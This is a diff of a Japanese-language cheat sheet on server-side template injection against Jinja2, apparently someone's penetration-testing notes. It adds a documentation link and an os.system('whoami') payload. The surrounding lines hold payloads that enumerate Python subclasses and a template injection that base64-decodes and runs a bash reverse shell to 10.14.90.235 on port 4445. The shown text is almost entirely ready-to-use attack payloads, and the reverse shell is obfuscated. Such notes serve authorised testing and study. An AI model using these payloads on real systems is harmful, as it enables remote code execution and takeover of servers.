@@ -42,6 +42,8 @@ PHP コードを直接実行できる
 
 ### Jinja2
 
+https://jinja.palletsprojects.com/en/stable/
+
 ```Python
 # objectクラスのサブクラス一覧
 {{"".__class__.__mro__[1].__subclasses__()}}
@@ -52,6 +54,10 @@ PHP コードを直接実行できる
 
 # よりスマートな方法
 {{request.application.__globals__.__builtins__.__import__('os').popen('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjE0LjkwLjIzNS80NDQ1IDA+JjE=|base64 -d|bash').read()}}
+```
+
+```python
+{% import os %}{{ os.system("whoami") }}
 ```
 
 ## SSTImap 自動化
